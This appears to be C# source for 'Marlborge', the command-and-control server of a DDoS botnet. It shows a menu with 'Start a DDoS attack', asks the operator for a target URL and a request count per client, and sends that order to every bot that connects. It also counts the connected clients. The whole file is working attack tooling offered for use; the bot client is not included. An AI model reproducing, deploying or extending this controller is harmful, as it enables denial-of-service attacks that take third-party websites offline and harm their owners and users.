using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Threading;

namespace Marlborge_Server
{
    class Program
    {
        static TcpListener server = null;
        static IPAddress lhost = IPAddress.Parse("0.0.0.0"); // Don't change
        static int lport = 3000; // Change this to your client port
        static List<TcpClient> listConnectedClients = new List<TcpClient>();

        static void Main(string[] args)
        {
            StartUp();
        }

        static void StartUp()
        {
            Console.Clear();
            Thread.Sleep(1000);
            try
            {
                server = new TcpListener(lhost, lport);
                server.Start();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(@"
 __ __            _  _                       
|  \  \ ___  _ _ | || |_  ___  _ _  ___  ___ 
|     |<_> || '_>| || . \/ . \| '_>/ . |/ ._>
|_|_|_|<___||_|  |_||___/\___/|_|  \_. |\___.
                                   <___'     
                ");
                Console.Write("By: ");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("PR3C14D0\n");

                Console.ForegroundColor = ConsoleColor.Blue;
                Console.WriteLine(@"
1) Start a DDoS attack
2) View connected clients

");

                Console.ForegroundColor = ConsoleColor.Yellow;

                Console.Write("preciado@marlborge:~$ ");
                Console.ForegroundColor = ConsoleColor.Red;
                string opt = Console.ReadLine();

                switch(opt)
                {
                    case "1":
                        DDoS();
                        break;
                    case "2":
                        ConnectedClients();
                        break;
                    default:
                        Console.WriteLine("Invalid option. Returning to menu in 3 secs...");
                        Thread.Sleep(3000);
                        StartUp();
                        break;
                }
            } catch(Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Failed to start Marlborge. Restarting...");
                Thread.Sleep(1000);
                Restart();
            }
        }

        static void DDoS()
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("\nEnter the site url (with http[s]): ");
                string url = Console.ReadLine();
                Console.Write("\nEnter the request quantity per client: ");
                string quantity = Console.ReadLine();
                string dataStr = url + "," + quantity;
                if (url.StartsWith("http") || url.StartsWith("http"))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("CTRL + C for exiting Marlborge once you end the DDoS");
                    byte[] data = Encoding.ASCII.GetBytes(dataStr);
                    while (true)
                    {
                        TcpClient client = server.AcceptTcpClient();
                        NetworkStream networkStream = client.GetStream();
                        networkStream.Write(data, 0, data.Length);
                        networkStream.Close();
                        client.Close();
                    }
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Invalid URL format. Restarting in 3 secs...");
                    Thread.Sleep(3000);
                }
            } catch(Exception e)
            {
                Restart();
            }
        }

        static void ConnectedClients()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("CTRL + C for exiting when you want.");
            while(true)
            {
                TcpClient client = server.AcceptTcpClient();
                listConnectedClients.Add(client);
                Console.WriteLine("Connected clients: " + listConnectedClients.Count.ToString());
            }
        }

        static void Restart()
        {
            server.Stop();
            server = null;
            StartUp();
        }
    }
}
